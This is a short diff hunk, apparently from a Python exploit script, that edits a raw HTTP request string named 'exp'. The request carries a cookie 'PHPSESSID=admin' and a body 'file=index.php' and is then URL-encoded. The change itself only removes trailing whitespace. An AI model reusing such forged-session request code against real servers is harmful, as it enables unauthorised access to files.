@@ -9,7 +9,7 @@ Cookie: PHPSESSID=admin
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 95
- 
+
 file=index.php'''
 # print exp.split("\n")
 tmp = urllib.quote(exp)
